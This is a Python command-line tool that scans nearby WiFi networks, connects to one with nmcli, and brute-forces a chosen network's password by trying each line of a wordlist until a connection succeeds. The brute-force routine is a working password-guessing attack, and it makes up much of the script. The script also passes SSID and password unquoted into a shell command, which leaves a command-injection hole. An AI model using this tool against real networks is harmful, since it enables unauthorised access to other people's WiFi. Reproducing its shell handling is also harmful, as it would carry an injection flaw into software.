from wifi import Cell, Scheme
import texttable as tt
from termcolor import cprint 
import time

def scan_wifi():
    tab = tt.Texttable()
    headings = ['SSID', 'SIGNAL', 'FREQUENCY', 'CHANNEL', '  MAC ADDRESS  ', 'ENCRYPTION']
    tab.header(headings)

    ssid = []
    signl = []
    freq = []
    chnl = []
    addr = []
    encry = []
    connection = 0

    print("\n* * * Scanning for WiFi connections * * *\n")

    try:
        for cell in Cell.all('wlan0'):
            connection += 1
            ssid.append(cell.ssid)
            signl.append(str(cell.signal)+" dB")
            freq.append(cell.frequency)
            chnl.append(cell.channel)
            addr.append(cell.address)
            encryp = cell.encryption_type if cell.encrypted == True else "open"
            encry.append(encryp.upper())

        for row in zip(ssid, signl, freq, chnl, addr, encry):
            tab.add_row(row)

        s = tab.draw()
        print (s)

        if connection == 0:
            cprint("\n[-] No WiFi connection in your area", 'red')
            exit()
        else:
            cprint("\n[+] "+str(connection) + " WiFi connection/s found",'green')
    except Exception as e:
        cprint(e,"yellow")
        cprint("[!!] Something went wrong","yellow")

def connect_wifi(ssid,passkey):
    try:
        import subprocess
        output = subprocess.check_output(f"nmcli dev wifi connect {ssid} password {passkey}", shell=True)
        if "Device 'wlan0' successfully activated" in str(output):
            cprint(f"[+] WiFi '{ssid}' successfully connected with '{passkey}'","green")
            return True
        else:
            cprint(f"[-] Wrong password","red")
            time.sleep(5)
            return False
    except:
        cprint("[!!] Invalid key","yellow")
        
def brute_force_pass(ssid,wordlist):
    with open(wordlist,'rt') as file:
        for line in file.readlines():
            password = line.strip()
            if (connect_wifi(ssid,password)):
                break

if __name__ == "__main__":
    while(True):
        cprint("\n[+] * * * * * * * * MENU * * * * * * * *\n",'magenta',attrs=['bold'])
        cprint("[+] scan - scan wifi connections",'magenta',attrs=['bold'])
        cprint("[+] connect - connect to wifi connection",'magenta',attrs=['bold'])
        cprint("[+] bruteforce - brute force wifi connection",'magenta',attrs=['bold'])
        cprint("[+] exit - exit",'magenta',attrs=['bold'])
        c = input("\n[+] * Enter choice : ")
        if ("scan" in c):
            scan_wifi()
        elif ("connect" in c):
            ssid = input("\n[+] * Enter SSID : ")
            passkey = input("[+] * Enter PASSWORD : ")
            connect_wifi(ssid,passkey)
        elif ("bruteforce" in c):
            ssid = input("\n[+] * Enter SSID : ")
            passkey = input("[+] * Enter PASSWORD File path : ")
            brute_force_pass(ssid,passkey)
        elif ("help" in c):
            cprint("\nscan -  scan WiFi connections\nconnect - connect to a WiFi connection\nexit - exit program\nhelp - this help message",'cyan')
        elif ("exit" in c):
            cprint("[+] Exiting ...\n",'red')
            exit()
        else:
            print("\nType help\n")
